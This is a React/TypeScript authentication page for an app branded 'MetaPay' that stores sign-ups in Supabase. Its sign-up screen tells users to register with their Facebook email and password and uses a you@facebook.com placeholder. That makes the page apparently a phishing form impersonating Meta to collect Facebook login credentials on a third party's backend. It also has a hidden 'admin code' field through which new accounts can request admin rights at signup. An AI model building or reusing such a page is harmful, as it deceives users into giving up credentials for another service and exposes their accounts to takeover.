import { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { supabase } from '@/integrations/supabase/client';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Checkbox } from '@/components/ui/checkbox';
import { Card } from '@/components/ui/card';
import { toast } from '@/hooks/use-toast';
import { Loader2, Eye, EyeOff, Check, X } from 'lucide-react';
import { z } from 'zod';

const emailSchema = z.string().email('Please enter a valid email address');

const passwordSchema = z.string()
  .min(8, 'Password must be at least 8 characters')
  .regex(/[A-Z]/, 'Password must contain at least one uppercase letter')
  .regex(/[0-9]/, 'Password must contain at least one number');

export default function Auth() {
  const navigate = useNavigate();
  const [isSignUp, setIsSignUp] = useState(false);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [confirmPassword, setConfirmPassword] = useState('');
  const [fullName, setFullName] = useState('');
  const [agreedToTerms, setAgreedToTerms] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [adminCode, setAdminCode] = useState('');
  const [showAdminCode, setShowAdminCode] = useState(false);

  const passwordRules = [
    { label: '≥ 8 characters', met: password.length >= 8 },
    { label: '1 uppercase letter', met: /[A-Z]/.test(password) },
    { label: '1 number', met: /[0-9]/.test(password) },
  ];

  const isFormValid = () => {
    if (!isSignUp) {
      return email && password;
    }
    return (
      email &&
      password &&
      confirmPassword &&
      password === confirmPassword &&
      agreedToTerms &&
      passwordRules.every(r => r.met)
    );
  };

  const handleSignUp = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!isFormValid()) return;

    setIsLoading(true);

    try {
      emailSchema.parse(email);
      passwordSchema.parse(password);

      if (password !== confirmPassword) {
        toast({
          title: 'Passwords do not match',
          description: 'Please make sure your passwords match',
          variant: 'destructive',
        });
        return;
      }

      const { data, error } = await supabase.auth.signUp({
        email,
        password,
        options: {
          emailRedirectTo: `${window.location.origin}/`,
          data: {
            full_name: fullName || email.split('@')[0],
          },
        },
      });

      if (error) {
        if (error.message.includes('already registered')) {
          toast({
            title: 'Account already exists',
            description: 'Please sign in instead',
            variant: 'destructive',
          });
          setIsSignUp(false);
          return;
        }
        throw error;
      }

      if (data.user) {
        // If admin code provided, request admin assignment via backend function
        if (adminCode && adminCode.trim()) {
          const { data: assignData, error: assignError } = await supabase.functions.invoke('assign-admin', {
            body: { userId: data.user.id, code: adminCode }
          });
          if (!assignError && assignData?.success) {
            toast({
              title: 'Admin account created!',
              description: 'Welcome to MetaPay with admin privileges',
            });
          } else if (assignError) {
            toast({ title: 'Invalid admin code', description: 'Continuing with a normal account', variant: 'destructive' });
          }
        } else {
          toast({ title: 'Account created!', description: 'Welcome to MetaPay' });
        }
        navigate('/?new=true');
      }
    } catch (error: any) {
      console.error('Sign up error:', error);
      toast({
        title: 'Could not create account',
        description: error.message || 'Please try again later',
        variant: 'destructive',
      });
    } finally {
      setIsLoading(false);
    }
  };

  const handleSignIn = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!email || !password) return;

    setIsLoading(true);

    try {
      const { data, error } = await supabase.auth.signInWithPassword({
        email,
        password,
      });

      if (error) throw error;

      if (data.user) {
        toast({
          title: 'Welcome back!',
          description: 'Signed in successfully',
        });
        navigate('/');
      }
    } catch (error: any) {
      console.error('Sign in error:', error);
      toast({
        title: 'Sign in failed',
        description: 'Invalid email or password',
        variant: 'destructive',
      });
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-background flex items-center justify-center p-4">
      <Card className="w-full max-w-md p-8">
        <div className="text-center mb-8">
          <h1 className="text-2xl font-bold text-primary mb-2">MetaPay</h1>
          {isSignUp ? (
            <>
              <h2 className="text-xl font-semibold mb-1">
                Sign up with your Facebook email and password
              </h2>
              <p className="text-sm text-muted-foreground">
                Use the same email you log into Facebook with.
              </p>
            </>
          ) : (
            <h2 className="text-xl font-semibold">Sign in to MetaPay</h2>
          )}
        </div>

        <form onSubmit={isSignUp ? handleSignUp : handleSignIn} className="space-y-4">
          {isSignUp && (
            <div>
              <Label htmlFor="fullName">Full Name (Optional)</Label>
              <Input
                id="fullName"
                type="text"
                placeholder="Your name"
                value={fullName}
                onChange={(e) => setFullName(e.target.value)}
                disabled={isLoading}
              />
            </div>
          )}

          <div>
            <Label htmlFor="email">Email</Label>
            <Input
              id="email"
              type="email"
              placeholder="you@facebook.com"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              disabled={isLoading}
              required
            />
          </div>

          <div>
            <Label htmlFor="password">Password</Label>
            <div className="relative">
              <Input
                id="password"
                type={showPassword ? 'text' : 'password'}
                placeholder="••••••••"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                disabled={isLoading}
                required
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground"
              >
                {showPassword ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
              </button>
            </div>
          </div>

          {isSignUp && (
            <>
              <div className="space-y-2">
                {passwordRules.map((rule) => (
                  <div key={rule.label} className="flex items-center gap-2 text-sm">
                    {rule.met ? (
                      <Check className="h-4 w-4 text-success" />
                    ) : (
                      <X className="h-4 w-4 text-muted-foreground" />
                    )}
                    <span className={rule.met ? 'text-success' : 'text-muted-foreground'}>
                      {rule.label}
                    </span>
                  </div>
                ))}
              </div>

              <div>
                <Label htmlFor="confirmPassword">Confirm Password</Label>
                <Input
                  id="confirmPassword"
                  type="password"
                  placeholder="••••••••"
                  value={confirmPassword}
                  onChange={(e) => setConfirmPassword(e.target.value)}
                  disabled={isLoading}
                  required
                />
              </div>

              <div className="flex items-start gap-2">
                <Checkbox
                  id="terms"
                  checked={agreedToTerms}
                  onCheckedChange={(checked) => setAgreedToTerms(checked as boolean)}
                  disabled={isLoading}
                />
                <label htmlFor="terms" className="text-sm text-muted-foreground cursor-pointer">
                  I agree to MetaPay Terms
                </label>
              </div>
            </>
          )}

          <Button
            type="submit"
            className="w-full"
            disabled={!isFormValid() || isLoading}
          >
            {isLoading ? (
              <>
                <Loader2 className="h-4 w-4 mr-2 animate-spin" />
                {isSignUp ? 'Creating account...' : 'Signing in...'}
              </>
            ) : (
              isSignUp ? 'Create account' : 'Sign in'
            )}
          </Button>
        </form>

        <div className="mt-6 text-center space-y-2">
          <button
            onClick={() => {
              setIsSignUp(!isSignUp);
              setPassword('');
              setConfirmPassword('');
              setAgreedToTerms(false);
              setAdminCode('');
              setShowAdminCode(false);
            }}
            className="text-sm text-primary hover:underline"
            disabled={isLoading}
          >
            {isSignUp
              ? 'Already have an account? Sign in'
              : "Don't have an account? Sign up"}
          </button>
          
          {isSignUp && (
            <div>
              <button
                onClick={() => setShowAdminCode(!showAdminCode)}
                className="text-xs text-muted-foreground hover:text-foreground"
                type="button"
              >
                {showAdminCode ? 'Hide admin code' : 'Have an admin code?'}
              </button>
            </div>
          )}
        </div>
        
        {isSignUp && showAdminCode && (
          <div className="mt-4">
            <Label htmlFor="adminCode">Admin Code (Optional)</Label>
            <Input
              id="adminCode"
              type="password"
              placeholder="Enter admin code"
              value={adminCode}
              onChange={(e) => setAdminCode(e.target.value)}
              disabled={isLoading}
            />
          </div>
        )}
      </Card>
    </div>
  );
}
